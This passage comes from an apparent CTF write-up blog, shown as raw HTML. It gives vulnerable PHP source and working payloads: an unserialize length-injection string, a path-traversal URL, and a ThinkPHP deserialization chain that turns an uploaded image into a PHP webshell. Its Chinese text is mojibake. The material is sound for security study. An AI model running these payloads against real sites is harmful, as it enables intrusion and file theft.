Profile&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">        $value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¿”å›é€‰æ‹©çš„ç»“æœ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">            $config[<span class="string">'hostname'</span>],</span><br><span class="line">            $config[<span class="string">'username'</span>], </span><br><span class="line">            $config[<span class="string">'password'</span>]</span><br><span class="line">        );</span><br><span class="line">        mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ordinary sql query</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">        $result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">        $key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">        $value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">        $sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);       <span class="comment">#\   \\ </span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">        <span class="comment">// 'where' will be replaced by 'hacker',which leads to string length plus one for each replacement.</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>
<p>config.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">    $config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">    $config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">    $config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">    $flag = &apos;&apos;; // &lt;= flag is here and we need to read it.</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>see <code>unserialize()</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511495-8ac41c80-aa29-11e9-9ffb-2e1889602ebb.png" alt="1562311707783"></p>
<p>As mentioned in source code, we can generate the payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/60750111-694d4480-9fd6-11e9-872e-aabff95d0aa9.png" alt="image"></p>
<p>After doing that, go to <code>profile.php</code>, which will show us a base64 code in its source code:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511543-aaf3db80-aa29-11e9-86a0-81b289e9d78a.png" alt="1562385121228"></p>
<h2 id="HTCF2018-warmup">HTCF2018 warmup</h2>
<p>source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">	<span class="comment">// to include ffffllllaaaagggg</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">	    <span class="comment">// has to be string</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">// must be in whitelist</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">	    <span class="comment">// also must be in whitelist</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"if"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ifif"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file=source.php?/../../../../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>It is notable that <code>source.php?/</code> was regarded as a folder , though not exits, and we should jump out of it using a <code>../</code>.</p>
<h2 id="2019å¼ºç½‘æ¯-upload">2019å¼ºç½‘æ¯ upload</h2>
<p>è™½ç„¶åå­—å«åš<code>upload</code> ä½†æ˜¯æ›´å¤šåé‡äºä»£ç å®¡è®¡ï¼Œé¦–å…ˆæ ¹æ®ç¬¬äºŒé¢˜çš„æç¤º(???)ï¼Œå‘ç°äº†ä¸€ä¸ª<code>/www.tar.gz</code> ï¼Œè§£å‹ä¹‹åæ‰“å¼€æ˜¯<code>thinkphp</code>æºç ï¼Œç„¶åä»å®˜ç½‘ä¸­ä¸‹è½½æºç ï¼Œå¯¹æ¯”å‘ç°åœ¨<code>application</code> ç›®å½•ä¸‹é¢å¤šäº†ä¸€ä¸ª<code>web</code> ç›®å½•ï¼Œé‡Œé¢æœ‰ä»·å€¼çš„æ–‡ä»¶æœ‰<code>Index.php</code> <code>Profile.php</code> <code>Login.php</code> <code>Register.php</code> ,ç„¶åã€‚ã€‚ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;<span class="comment">//å› ä¸ºæœ€åæˆ‘ä»¬ä¸ä¸Šä¼ æ–‡ä»¶ï¼Œæ‰€ä»¥è·³è¿‡è¿™æ®µ</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">........</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å½“è®¿é—®ä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™è°ƒç”¨</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½“è®¿é—®ä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">	    <span class="comment">// ååºåˆ—åŒ–æ¼æ´è­¦å‘Š</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// è¦ç”¨ååºåˆ—åŒ–è§¦å‘ä»£ç ï¼Œéœ€è¦ç”³è¯·çš„ç±»åº”è¯¥å°±æ˜¯registerç±»</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ€è·¯ï¼š</p>
<ul>
<li>å…ˆä¸Šä¼ å›¾ç‰‡é©¬ï¼ˆæ”¹åç¼€åä¸ºpngï¼Œä¸Šä¼ å¤±è´¥ï¼Œåœ¨phpæ–‡ä»¶å¼€å¤´åŠ ä¸Š<code>GIF89a</code>ä¹‹åå†æ”¹æˆpngæ–‡ä»¶å°±å¯ä»¥æˆåŠŸä¸Šä¼ äº†)</li>
<li>ä¸Šä¼ ç”¨æˆ·cookieæ¥è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œå°†ä¹‹å‰ä¸Šä¼ çš„å›¾ç‰‡copyä¸ºphpåç¼€åçš„æ–‡ä»¶
<ul>
<li>è¦è§¦å‘<code>upload_img</code>å‡½æ•°ï¼Œå¿…é¡»è¦é€šè¿‡<code>Profile</code>ç±»çš„<code>__get</code>æˆ–è€…<code>__call</code></li>
<li>è¦è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œè‚¯å®šè¦æ³¨å†Œregister ç±»</li>
<li>æˆ‘ä»¬çš„cookieä¼ è¿›å¯¹é¢çš„Index.phpä¸­æ—¶ï¼Œç»è¿‡ååºåˆ—åŒ–ï¼Œä¼šç”Ÿæˆä¸€ä¸ªregisterç±»å¹¶ä¸”ç”Ÿå­˜æœŸåªæœ‰é‚£ä¸€è¡Œï¼Œå¿…ç„¶è§¦å‘<code>__destruct</code>å‡½æ•°ã€‚</li>
<li><code>__destruct</code>å‡½æ•°ä¼šè§¦å‘checkerçš„<code>index()</code>æ–¹æ³•ã€‚å‡å®š<code>checker</code> æ˜¯<code>profile</code>ç±»ï¼Œä½†æ˜¯index()åœ¨<code>profile</code>ç±»ä¸­ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œ<code>__call</code> æ–¹æ³•ï¼Œ<code>__call()</code>æ–¹æ³•åˆä¼šè§¦å‘<code>__get()</code>ï¼Œ<code>__get()</code>è¿”å›Profileç±»çš„<code>except[$name]</code>ï¼Œå¹¶åœ¨<code>__call()</code>ä¸­è¢«å½“åšæ–¹æ³•æ‰§è¡Œï¼ˆè€Œä¸”argumentä¸ºç©ºï¼‰</li>
<li>å› æ­¤ï¼Œ<code>except[$name]</code>åº”è¯¥å¾—æ˜¯<code>upload_img</code>ï¼Œè€Œä¸”é‚£ä¸ª<code>$name</code>å°±æ˜¯<code>index</code>ï¼Œå› æ­¤ï¼Œ<code>$this-&gt;except = array('index' =&gt; 'upload_img');</code></li>
<li><code>filename_tmp</code>æ˜¯ä¹‹å‰ä¸Šä¼ çš„å›¾ç‰‡é©¬ï¼Œ<code>filename</code>æ˜¯æˆ‘ä»¬è¦æ‹·è´åˆ°çš„phpæ–‡ä»¶å</li>
</ul>
</li>
</ul>
<p>æœ€ç»ˆpayload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\web\controller;</span><br><span class="line">$test = new Profile();</span><br><span class="line">$test -&gt; checker = 0;</span><br><span class="line">$test -&gt; except = array(&apos;index&apos; =&gt; &apos;upload	_img&apos;);</span><br><span class="line">$test -&gt; filename_tmp = &quot;./upload/08856017fa6b6b422db719c5519123dc/6d801eac2d3e2a4c8fa1c1ff256902a9.png&quot;;</span><br><span class="line">$test -&gt; filename = &quot;./upload/08856017fa6b6b422db719c5519123dc/gg.php&quot;;</span><br><span class="line">$test -&gt; ext = 1;</span><br><span class="line"></span><br><span class="line">$a = new Register();</span><br><span class="line">$a -&gt; checker = $test;</span><br><span class="line">$a -&gt; registed = 0;</span><br><span class="line"></span><br><span class="line">$exp = base64_encode(serialize($a));</span><br><span class="line">// var_dump($exp);</span><br><span class="line">echo $exp;</span><br></pre></td></tr></table></figure>
<p>ç„¶åç”¨èšå‰‘è¿æ¥å°±å¯ä»¥äº†ã€‚</p>
<blockquote>
<p>ps: æ³¨æ„å¿…é¡»è¦æŒ‡å®šå‘½åç©ºé—´, è¦ä¸ç„¶å¯¹è±¡åºåˆ—åŒ–ä¼šå‡ºé”™æˆ–è€…æ˜¯å’Œé¢„æœŸå¯¹è±¡ä¸åŒ</p>
</blockquote>
<h2 id="p4é˜Ÿä¼å‡ºçš„ä¸€é“é¢˜">p4é˜Ÿä¼å‡ºçš„ä¸€é“é¢˜</h2>
<p>è¿›å…¥ç½‘ç«™ä¹‹åæ‹¿åˆ°bakæ–‡ä»¶ï¼Œç”¨sublimeæ‰“å¼€ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">        <span class="comment">//0xC0äºŒè¿›åˆ¶æ˜¯ï¼š1100 0000</span></span><br><span class="line">        <span class="comment">//64  äºŒè¿›åˆ¶æ˜¯ï¼š0100 0000</span></span><br><span class="line">        <span class="comment">//0 0 0 64 64 64 0 64 0 0 64 0 0 0 64 64 64 64 0 0 0 64 0 0 64 0 64 0 64 64 0 0 </span></span><br><span class="line">        <span class="comment">//1 1 1 A  A  A  1 A  1 1 A  1 1 1 a  a  a  a  1 1 1 a  1 1 a  1 a  1 a  a  1 1</span></span><br><span class="line">        <span 